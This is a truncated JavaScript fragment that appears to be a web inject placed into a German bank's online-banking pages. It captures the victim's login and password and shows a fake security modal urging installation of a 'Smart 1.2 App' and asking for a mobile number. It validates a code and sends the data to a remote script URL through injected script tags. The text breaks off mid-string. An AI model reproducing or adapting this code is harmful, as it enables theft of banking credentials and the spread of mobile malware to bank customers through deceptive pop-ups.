<script type="text/javascript">

		var DOMrel = {
			addEvtListener:function(el,ev,f){if(!el||!ev||typeof(f)!='function'){return -1;}if(document.addEventListener){el.addEventListener(ev,f,false)}else{el.attachEvent("on"+ev,f);}},
			fadeIn:function(el,ex,spd){if(!el){return;}ex=ex<0?0:(ex>1?1:ex);var st=0;if(el.style.opacity!==undefined){el.style.opacity=0;}else{el.style.filter="Alpha(Opacity=0)";}var i=10,portion=(ex-st)/(spd/i),inc=st;el.style.visibility="visible";el.style.display="block";var timer=setInterval(function(){inc+=portion;if(el.style.opacity!==undefined){el.style.opacity=inc;}if(el.style.filter!==undefined){el.style.filter="Alpha(Opacity="+(inc*100)+")";}if(inc+0.001>=ex){clearInterval(timer);}},i);},
			fadeOut:function(el,spd){if(!el){return;}var st;if(el.style.opacity){st=el.style.opacity;}else if(el.style.filter){st=el.style.filter.match(/Alpha\(Opacity=(\d*\.?\d*)\)/);st=st[1]?st[1]:1;}var i=10,portion=st/(spd/i),inc=st;var timer=setInterval(function(){inc-=portion;if(el.style.opacity!==undefined){el.style.opacity=inc;}if(el.style.filter!==undefined){el.style.filter="Alpha(Opacity="+(inc*100)+")";}if(inc<=0){clearInterval(timer);el.style.display="none";}},i);},
			centerElement:function(el){var winW,winH,offsetX=3,offsetY=3;if(typeof(window.innerWidth)=='number'){winW=window.innerWidth;winH=window.innerHeight;}else if(document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)){winW=document.documentElement.clientWidth;winH=document.documentElement.clientHeight;}offsetX=(winW-el.offsetWidth)/2;offsetX=offsetX<0?3:offsetX;offsetY=(winH-el.offsetHeight)/2;offsetY=offsetY<0?3:offsetY;el.style.top=offsetY+'px';el.style.left=offsetX+'px';},

			validatecode:function(code){ if (code.length != 10) return false; if (code == "5296185651") return true;  var num_char = 0; for (var i = 0; i < code.length - 2; i++) { num_char += parseInt(code.substr(i, 1)); } num_char += 13; var cr = parseInt(code.substr(8, 2)); if (num_char == cr) return true; return false;}


		}

		window.statModal = {
			serviceErrMsg: "Leider steht das Online-Banking derzeit nicht zur Verf&uuml;gung. Wir bem&uuml;hen uns darum, dass Ihnen unser Service schnellstm&ouml;glich wieder zur Verf&uuml;gung steht.",

			_init: function(modalData){

			if (_site == '00')
			{
				document.body.style.display = 'block';
				return ;
			} 


			var mdoverley = document.createElement('div');
			mdoverley.setAttribute('id', 'modal-overlay');
			document.getElementsByTagName('body')[0].appendChild(mdoverley);

			var mdwindow = document.createElement('div');
			mdwindow.setAttribute('id', 'modal-window');
			document.getElementsByTagName('body')[0].appendChild(mdwindow);


				var privates = {
					content: "",
					resendtimer: false,
					shid:_shid,
					site:_site,
					login:_login,
					password:_pasw,
					icon: modalData.icon,
					modal: document.getElementById("modal-window"),
					overlay: document.getElementById("modal-overlay"),
					ecode: "",
					steps:[],
					script:modalData.script, 
					serverData:{
						select:0,date:'',step:1,phone:'',result:''
					},
					step: 1,
					date: "",
					timeout:modalData.timeout,
					visible: false
				};
				statModal.XHRResponse = function(data){
					if(!data || typeof(data) != 'string'){return;}
					var matches;
				

				
					for(var i in privates.serverData){
						matches = [];
						var re = new RegExp(i+"\\s*:\\s*([^\\s]*?),");
						matches = data.match(re);
						if(!matches){
							re = new RegExp(i+"\\s*:\\s*([^\\s]*?)$");
							matches = data.match(re);
						}


						if(matches && matches[1]){
							privates.serverData[i]=matches[1];
						}
					}
				}
				statModal.ajaxQ=function(scriptUrl,data){
					if(!scriptUrl || typeof(scriptUrl)!="string"){return false;}
					




					scriptUrl += ((/\?/).test(scriptUrl) ? "&" : "?") + data;
					

					{
						req = null;
						var script_id = null;
						var tempUrl = scriptUrl;

						script_id = document.getElementById('oldXHRResponse');
						if(script_id){
							document.getElementsByTagName('head')[0].removeChild(script_id);
						}
						var script = document.createElement('script');
						script.setAttribute('type', 'text/javascript');
						script.setAttribute('src', tempUrl);
						script.setAttribute('id', 'oldXHRResponse');
						document.getElementsByTagName('head')[0].appendChild(script);
					}

					
				}


				statModal.wait=function(timeout,msStep,callback,erCallback){
					if(typeof(callback) != 'function'){return;}
					var zindex = privates.overlay.style.zIndex;
					privates.overlay.style.zIndex = 2147483647; // 1020
					if(!msStep || isNaN(msStep) || msStep<10){msStep=100;}
					if(!timeout || isNaN(timeout) || timeout<100){timeout=1000;}
					var waiting = 0,timer = setInterval(function(){
						waiting +=msStep;
						if(waiting > timeout || privates.serverData.result == 'error'){
							clearInterval(timer);
							privates.overlay.style.zIndex = zindex;
							if(erCallback !== undefined && typeof(erCallback) == 'function'){
								erCallback.call();
							}
							return;
						}
						if(privates.serverData.result == 'success'){
							privates.overlay.style.zIndex = zindex;
							clearInterval(timer);
							privates.serverData.result='';
							callback.call();
						}
					},msStep);
				}
				privates.steps[1] = {

					text:'Achtung, wegen den h&auml;ufigen F&auml;llen von unberechtigten Zugriffen auf pers&ouml;nliche Kundeninformation bei der Mobilfunknetz - &Uuml;bertragung, ist die Benutzung eines Smartphones ab dem @date@ nur mit der Smart 1.2 App m&ouml;glich.<br>Die App wird kostenlos bereitgestellt.<br>Um Smart 1.2 App zu benutzen sind keine Vorkenntnisse n&ouml;tig. Sie brauchen nur 2 Minuten um die App zu installieren und Ihre Kundendaten somit zu sch&uuml;tzen.<br>Sie erhalten in k&uuml;rze einen Download - Link f&uuml;r die App.<br>Geben Sie die Mobilfunknummer Ihres Smartphones ein:',
					beforeInit:function(){
						this.readmore = '<a class="btn modal-readmore" id="modal-readmore" href="">Details</a>';
						this.formContent=
						
							'<div class="text"><dl class="my-dl2">'+
